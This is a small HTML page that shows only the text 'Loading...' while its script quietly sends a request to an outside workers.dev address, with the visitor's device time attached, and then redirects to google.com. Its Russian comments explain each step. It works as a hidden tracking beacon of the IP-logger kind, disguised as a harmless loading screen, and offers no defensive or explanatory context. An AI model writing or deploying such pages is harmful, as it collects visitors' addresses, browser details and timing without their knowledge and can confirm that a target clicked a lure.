<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Loading...</title>
    <script>
        // Твоя ссылка и текущее время устройства
        const url = "https://adminfdm.alexgranny1708.workers.dev/";
        const t = encodeURIComponent(new Date().toLocaleString());

        const i = new Image();
        function go() { window.location.replace("https://google.com"); }

        // Если воркер ответил или выдал ошибку — уходим в Google
        i.onload = go;
        i.onerror = go;

        // Отправка запроса с данными времени
        i.src = url + "?t=" + t;

        // Жесткий таймер на 2 секунды для надежности отправки
        setTimeout(go, 2000);
    </script>
</head>
<body>
    <p>Loading...</p>
</body>
</html>
